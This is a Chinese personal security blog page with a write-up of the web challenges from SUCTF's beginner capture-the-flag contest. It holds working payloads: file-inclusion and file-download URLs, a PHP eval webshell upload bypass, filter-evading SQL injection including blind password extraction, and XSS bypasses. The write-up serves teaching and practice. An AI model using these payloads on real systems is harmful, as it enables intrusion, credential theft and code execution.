<!DOCTYPE html>
<html lang="zh-cn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          suctf招新赛web全题解 - 信息安全个人wiki&amp;blog
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 4.2.1"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>信息安全个人WIKI&amp;BLOG</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
<li><a href="/about">About</a></li>
<li><a href="/note">Notes</a></li>
</ul>
<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
<li><a href="/contents/xss">WebSecurity-xss</a></li>
<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
<li><a href="/contents/FI">WebSecurity-FI</a></li>
<li><a href="/contents/rce">WebSecurity-rce</a></li>
<li><a href="/contents/upload">WebSecurity-upload</a></li>
<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
</ul>
<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
</ul>
<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
</ul>
<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
<li><a href="/contents/login">登录框渗透总结</a></li>
<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
</ul>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
<li>待补充</li>
</ul>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
</ul>
<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
<li>待补充</li>
</ul>
<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
<li><a href="/contents/tools">一些工具的使用命令</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <p>闲得无聊打打招新ctf</p>
<a id="more"></a> 

<h3 id="where-are-you-from-level1"><a href="#where-are-you-from-level1" class="headerlink" title="where are you from level1"></a>where are you from level1</h3><p>伪造ip即可</p>
<h3 id="include-me"><a href="#include-me" class="headerlink" title="include me"></a>include me</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.4.68.67:88&#x2F;?lang&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>

<h3 id="yunpan"><a href="#yunpan" class="headerlink" title="yunpan"></a>yunpan</h3><p>任意文件下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.4.68.67:90&#x2F;download.php?file&#x3D;ZmxhZy5waHA&#x3D;</span><br></pre></td></tr></table></figure>

<h3 id="onepiece"><a href="#onepiece" class="headerlink" title="onepiece"></a>onepiece</h3><p> 扫描源码扫到<code>.idea</code>泄露</p>
<p>发现<code>README.html</code> ，<code>UpL0ad.php</code></p>
<p><code>README.html</code> 页面下载到一个<code>zip</code>打开发现是加密的<code>php</code>文件，猜测是<code>UpL0ad.php</code>的源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tool.lu&#x2F;php</span><br></pre></td></tr></table></figure>

<p>这个网站解密得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$flag &#x3D; &quot;**********&quot;;</span><br><span class="line">if (isset($_POST[&#39;file&#39;])) &#123;</span><br><span class="line">    $filename &#x3D; $_POST[&#39;file&#39;];</span><br><span class="line">    echo $&#123;$filename&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此直接<code>post flag</code>即可</p>
<h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby upload"></a>baby upload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00截断和php3绕过jpgphp后缀判断，</span><br><span class="line">&lt;script language&#x3D;&#39;pHp&#39;&gt; @eval($_POST[&#39;x&#39;]);&lt;&#x2F;scrpt&gt;绕过后端验证</span><br></pre></td></tr></table></figure>

<p><img src="/img/suctf_1.png" alt=""></p>
<p>顺带拿了下源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] != <span class="string">'image/png'</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'only allow png!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $ct = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/&lt;\\?php/i'</span>, $ct)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"'&amp;lt;?php' not allowed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\\.php$/i'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]) || preg_match(<span class="string">'/\\.htaccess$/i'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" not allowed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="php-is-No-1"><a href="#php-is-No-1" class="headerlink" title="php is No.1"></a>php is No.1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'time'</span>])?$time = $_GET[<span class="string">'time'</span>]:$time = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'num'</span>])?$num = $_GET[<span class="string">'num'</span>]:$num = <span class="number">0</span>;</span><br><span class="line">$c=is_numeric($time) <span class="keyword">and</span> is_numeric($num);</span><br><span class="line"><span class="keyword">if</span> ($num == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>($num)&#123;</span><br><span class="line">        <span class="keyword">if</span>($c)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!is_numeric($time))</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Time time must be number'</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ($time &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'This time is too short'</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ($time &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'This time is too long'</span>;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sleep((int)$time);</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Try again'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Try again'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Try again'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一道组合题，<code>num</code>可以用0开头的数字和字母的组合绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们通过GET或者POST传入的参数，是作为字符串保存的。is_numeric()支持普通数字型字符串、科学记数法型字符串、部分支持十六进制0x型字符串。而强制类型转换int，不能正确转换的类型有十六进制型字符串、科学计数法型字符串（部分）。</span><br></pre></td></tr></table></figure>

<p>故可以构造如下<code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.4.68.67:94&#x2F;?time&#x3D;4e6&amp;num&#x3D;0xx</span><br></pre></td></tr></table></figure>

<p>sleep4秒后拿到flag</p>
<h3 id="where-are-you-from-level2"><a href="#where-are-you-from-level2" class="headerlink" title="where are you from level2"></a>where are you from level2</h3><p>伪造<code>ip</code>为<code>127.0.0.1</code>拿到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>]))&#123;</span><br><span class="line">        $cip=$_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">        $cip=$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]))&#123;</span><br><span class="line">        $cip=$_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $cip=<span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $cip=preg_replace(<span class="string">'/\s|select|from|limit|union|join/iU'</span>,<span class="string">''</span>,$cip);</span><br><span class="line">    <span class="keyword">return</span> $cip;</span><br><span class="line">&#125;</span><br><span class="line"> $query=$mysqli-&gt;query(<span class="string">"insert into ip_records(ip,time) values ('$ip','$time')"</span>);</span><br></pre></td></tr></table></figure>

<p> 很明显的<code>inset</code>注入，<code>replace</code>可以用双写绕过，空格用内敛注释绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#39;,(seselectlect&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;frfromom&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()));#  查表名</span><br><span class="line">&#x3D;&#x3D;&gt; mysql&gt; insert into ip_records(ip,time) values (&#39;127.0.0.1&#39;,(seselectlect&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;whwhereere&#x2F;**&#x2F;table_schema&#x3D;database()));#&#39;,&#39;1541756327&#39;);</span><br><span class="line"></span><br><span class="line">127.0.0.1&#39;,(seselectlect&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;frfromom&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flaaag&#39;));#   查列名</span><br><span class="line"></span><br><span class="line">127.0.0.1&#39;,(seselectlect&#x2F;**&#x2F;fl4g&#x2F;**&#x2F;frfromom&#x2F;**&#x2F;flaaag));#   查内容</span><br></pre></td></tr></table></figure>

<h3 id="Classic-Sqli"><a href="#Classic-Sqli" class="headerlink" title="Classic Sqli"></a>Classic Sqli</h3><p><img src="/img/suctf_2.png" alt=""></p>
<p>类似于<code>BSides Delhi CTF</code>的一道题，只是这题密码加了字母进去了，贴下以前的<code>wp</code></p>
<p>拿到题目，可以看到user和pw参数可控。</p>
<p><code>mysql_query($query);</code>用来执行一句mysql语句</p>
<p><code>mysql_fetch_array($result);</code> 用来将查询的值传入数组</p>
<p><code>if($result[&#39;user&#39;]) echo &quot;&lt;h2&gt;Welcome {$result[&#39;user&#39;]}&lt;/h2&gt;&quot;;</code> 如果查询到用户名和密码会返回<code>Welecome+用户名</code></p>
<p><code>if(($admin_pass[&#39;pw&#39;])&amp;&amp;($admin_pass[&#39;pw&#39;] === $_GET[&#39;pw&#39;]))</code> 得到<code>flag</code>的条件是需要拿到<code>admin</code>的密码</p>
<p>到这里就有了一点思路：通过盲注注出<code>admin</code>的密码</p>
<p>回到上方代码处</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$black_list = <span class="string">"/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|"</span>;</span><br><span class="line">$black_list .= <span class="string">"=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i"</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到基本什么玩意都被过滤了而且无法闭合单引号</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user from chal where user=<span class="string">''</span> <span class="keyword">and</span> pw=<span class="string">''</span></span><br></pre></td></tr></table></figure>

<p>边思考边在本地搭起了环境，并且把想要看到的值都<code>var_dump</code>出来方便调试</p>
<p>有点懵逼，想了半天，尝试了半天发现<code>regexp</code>没过滤，并且引号可以被<code>\</code>转译</p>
<p>而常规思路<code>regexp</code>需要有<code>select</code></p>
<p>于是我们考虑在<code>pw</code>处配合<code>||</code>进行注入</p>
<p>空格用<code>/**/</code>代替，正则里面的单引号用双引号代替</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=\&amp;pw=||pw<span class="comment">/**/</span>regexp<span class="comment">/**/</span><span class="string">"^a"</span>;<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>这样完整的查询语句变成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user from chal where user=<span class="string">'\' and pw='</span>||pw<span class="comment">/**/</span>regexp<span class="comment">/**/</span><span class="string">"^a"</span>;<span class="comment">/*'</span></span><br></pre></td></tr></table></figure>

<p>但是并没有回显！！懵逼了</p>
<p>后来在<code>mysql</code>里测试发现<code>/*</code>并不会完全执行，换成<code>%00</code></p>
<p>因为<code>%00</code>经过<code>urldecode</code>会变成空字符，把后面的截断，而上述过滤名单的<code>%00</code>实际上为<code>%2500</code>，有点坑。。这样传入进去</p>
<p><code>result</code>经过<code>vardump</code>出来的值变成了</p>
<p>并且页面回显了<code>welcome admin</code></p>
<p>于是就可以通过burp爆破一步一步把密码爆出来了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?user&#x3D;\&amp;pw&#x3D;||pw&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^1&quot;;%00 ⇒Welcome admin  &#x2F;&#x2F;这里会得到1，2，3三																			 个用户，其中1是admin</span><br><span class="line">GET &#x2F;?user&#x3D;\&amp;pw&#x3D;||pw&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^17&quot;;%00 ⇒Welcome admin</span><br><span class="line">GET &#x2F;?user&#x3D;\&amp;pw&#x3D;||pw&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^172&quot;;%00 ⇒Welcome admin</span><br><span class="line">GET &#x2F;?user&#x3D;\&amp;pw&#x3D;||pw&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^1729&quot;;%00 ⇒Welcome admin</span><br><span class="line">GET &#x2F;?user&#x3D;\&amp;pw&#x3D;||pw&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^17292&quot;;%00 ⇒Welcome admin</span><br><span class="line">GET &#x2F;?user&#x3D;\&amp;pw&#x3D;||pw&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^172921&quot;;%00 ⇒Welcome admin</span><br><span class="line">GET &#x2F;?user&#x3D;\&amp;pw&#x3D;||pw&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^1729211&quot;;%00 ⇒Welcome admin</span><br><span class="line">GET &#x2F;?user&#x3D;\&amp;pw&#x3D;||pw&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^17292115&quot;;%00 ⇒Welcome admin</span><br></pre></td></tr></table></figure>

<p>爆破得到<code>17292115</code>为<code>admin</code>的密码</p>
<p>构造最后的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;35.200.215.237&#x2F;?user&#x3D;123&amp;pw&#x3D;17292115</span><br></pre></td></tr></table></figure>

<p><img src="/img/suctf_3.png" alt=""></p>
<h3 id="xss1"><a href="#xss1" class="headerlink" title="xss1"></a>xss1</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (input.indexOf(<span class="string">'alert'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        input = input.replace(<span class="regexp">/(alert)+/g</span>, <span class="string">''</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    input = <span class="string">'console.log("'</span> + input + <span class="string">'");'</span>;</span><br><span class="line">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    script.innerText = input;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>在本地测试发现主要起作用的是这段<code>console.log(&quot;&#39; + input + &#39;&quot;);</code></p>
<p>过滤部分可以看到利用<code>while</code>循环将所有的<code>alert</code>过滤了，因此不可用双写绕过了，但是可以用<code>unicode</code>编码进行绕过，再闭合前方的<code>console</code>然后注释后面的即可</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'"); \u0061\u006c\u0065\u0072\u0074(1);&lt;!--</span></span><br></pre></td></tr></table></figure>

<h4 id="gallery"><a href="#gallery" class="headerlink" title="gallery"></a>gallery</h4><h4 id="xss2"><a href="#xss2" class="headerlink" title="xss2"></a>xss2</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    input = input.replace(<span class="regexp">/[^\[\]\!\+]+/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Filtered input: '</span> + input);</span><br><span class="line">    <span class="built_in">eval</span>(<span class="built_in">eval</span>(input) + <span class="string">'(1)'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目只允许输入<code>!+[]</code>，然后就没思路了。。。。。。</p>
<p>贴下官方<code>wp</code>，这姿势太骚了。。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">想到jsfuck， eval(eval(input) + ‘(1)’) ，综合题意，只要可以使用eval(input)构造出’alert’字符串即可。</span><br><span class="line">get到jsfuck的编码方式，就解开了本题。记录如下：</span><br><span class="line">以下内容基于</span><br><span class="line">[]      =&gt;  []</span><br><span class="line">然后!可以将原类型转化为布尔型</span><br><span class="line">![]     =&gt;  false</span><br><span class="line">!![]    =&gt;  true</span><br><span class="line">+可以将原类型转化为整形</span><br><span class="line">+[]     =&gt;  0</span><br><span class="line">+![]    =&gt;  0</span><br><span class="line">+!![]   =&gt;  1</span><br><span class="line">然后可以推出所有数字 </span><br><span class="line">然后+[]可以转化为字符串</span><br><span class="line">[]+[]   =&gt;  ""</span><br><span class="line">![]+[]  =&gt;  "false"</span><br><span class="line">或放在前边</span><br><span class="line">[]+![]  =&gt;  "false"</span><br><span class="line">+[]+[]  =&gt;  "0"</span><br><span class="line">加括号试试</span><br><span class="line">([]+![])  =&gt;  "false"</span><br><span class="line">[[]+![]]  =&gt;  ["false"]</span><br><span class="line">(+[]+[])  =&gt;  "0"</span><br><span class="line">[+[]+[]]  =&gt;  ["0"]</span><br><span class="line">可以类似数组取下标</span><br><span class="line">(![]+[])[+!![]] =&gt;  'a'</span><br><span class="line">然后就可以从'false', 'true'中依次读出'a','l','e','r','t'。em...但是题目过滤了小括号。需要稍微绕一下，考虑使用中括号</span><br><span class="line">[[]+![]]    =&gt;  ["false"]</span><br><span class="line">[![]+[]][+[]]    =&gt;  "false"</span><br><span class="line">[![]+[]][+[]][+!![]]    =&gt;  'a'</span><br><span class="line">成功</span><br><span class="line">最后用加号拼出"alert"即可。</span><br></pre></td></tr></table></figure>

